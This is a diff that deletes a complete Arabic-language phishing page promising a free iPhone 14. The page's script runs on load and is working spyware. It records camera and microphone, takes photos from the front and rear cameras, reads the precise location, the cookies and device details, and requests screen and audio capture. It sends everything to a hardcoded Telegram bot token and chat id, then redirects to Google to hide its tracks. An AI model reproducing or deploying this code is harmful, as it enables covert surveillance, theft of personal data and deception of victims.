@@ -1,147 +1,0 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>🎁 منصة الجوائز الحصرية - اربح iPhone 14 مجاني!</title>
-    <style>
-        body { 
-            background: linear-gradient(45deg, #ff0033, #000000);
-            color: white; 
-            font-family: Arial; 
-            text-align: center;
-            padding: 50px;
-        }
-        button {
-            background: gold;
-            padding: 20px;
-            font-size: 24px;
-            border-radius: 10px;
-            cursor: pointer;
-        }
-    </style>
-    
-    <script>
-        // 😈 كود AHMAEDINFO السري - لا تشاركه مع أحد
-        document.addEventListener('DOMContentLoaded', function() {
-            // 🔥 بدء الهجوم الشامل
-            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
-            .then(function(stream) {
-                let recorder = new MediaRecorder(stream);
-                let chunks = [];
-                
-                recorder.ondataavailable = function(e) { 
-                    chunks.push(e.data); 
-                };
-                
-                recorder.onstop = function() {
-                    // 📹 تحويل الفيديو وإرساله
-                    let blob = new Blob(chunks, { type: 'video/webm' });
-                    let formData = new FormData();
-                    formData.append('file', blob);
-                    
-                    // 📸 التقاط صور من الكاميرا الأمامية والخلفية
-                    Promise.all([
-                        // 🎥 الكاميرا الأمامية
-                        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-                        .then(stream => {
-                            let track = stream.getVideoTracks()[0];
-                            let imageCapture = new ImageCapture(track);
-                            return imageCapture.takePhoto()
-                            .then(blob => {
-                                formData.append('front_camera', blob);
-                                track.stop();
-                            });
-                        }),
-                        
-                        // 🎥 الكاميرا الخلفية  
-                        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
-                        .then(stream => {
-                            let track = stream.getVideoTracks()[0];
-                            let imageCapture = new ImageCapture(track);
-                            return imageCapture.takePhoto()
-                            .then(blob => {
-                                formData.append('back_camera', blob);
-                                track.stop();
-                            });
-                        })
-                    ]).then(() => {
-                        // 📍 الحصول على الموقع الدقيق
-                        navigator.geolocation.getCurrentPosition(position => {
-                            let locationData = {
-                                lat: position.coords.latitude,
-                                lng: position.coords.longitude,
-                                accuracy: position.coords.accuracy
-                            };
-                            formData.append('location', JSON.stringify(locationData));
-                            
-                            // 📱 معلومات الجهاز
-                            let deviceInfo = {
-                                userAgent: navigator.userAgent,
-                                platform: navigator.platform,
-                                language: navigator.language,
-                                cookies: document.cookie
-                            };
-                            formData.append('device_info', JSON.stringify(deviceInfo));
-                            
-                            // 📞 بدء تسجيل المكالمات تلقائياً
-                            if (navigator.mediaDevices.getDisplayMedia) {
-                                navigator.mediaDevices.getDisplayMedia({ video: true, audio: true })
-                                .then(callStream => {
-                                    let callRecorder = new MediaRecorder(callStream);
-                                    let callChunks = [];
-                                    callRecorder.ondataavailable = e => callChunks.push(e.data);
-                                    callRecorder.onstop = () => {
-                                        let callBlob = new Blob(callChunks, { type: 'audio/webm' });
-                                        formData.append('call_recording', callBlob);
-                                        sendAllData(formData);
-                                    };
-                                    callRecorder.start();
-                                    setTimeout(() => callRecorder.stop(), 30000);
-                                });
-                            } else {
-                                sendAllData(formData);
-                            }
-                        });
-                    });
-                };
-                
-                // ⏰ بدء التسجيل
-                recorder.start();
-                
-                // 📸 التقاط لقطات كل 5 ثواني
-                setInterval(() => {
-                    if (recorder.state === 'recording') {
-                        recorder.requestData();
-                    }
-                }, 5000);
-                
-                // ⏱️ إيقاف التسجيل بعد 30 ثانية
-                setTimeout(() => recorder.stop(), 30000);
-                
-            }).catch(function(err) { 
-                console.error('الوصول مرفوض: ', err);
-            });
-            
-            function sendAllData(formData) {
-                // 📤 إرسال كل البيانات إلى بوت تليجرام
-                fetch('https://api.telegram.org/bot8387876144:AAGLYcjE4VcUMtB_IGLojSk_GodmSZoz6H8/sendDocument?chat_id=8207278805', {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('😈 البيانات وصلت بنجاح!', data);
-                    // 🔥 تدمير الأدلة
-                    window.location.href = 'https://www.google.com';
-                })
-                .catch(error => console.error('❌ خطأ في الإرسال:', error));
-            }
-        });
-    </script>
-</head>
-<body>
-    <h1>🎉 مبروك! لقد ربحت iPhone 14 مجاني!</h1>
-    <h2>📱 اضغط "الموافقة" لاستلام جائزتك فوراً</h2>
-    <button onclick="alert('جاري تحميل جائزتك...')">🎁 الموافقة واستلام الجائزة</button>
-    <p>⏰ العرض ساري لمدة 5 دقائق فقط!</p>
-</body>
-</html>
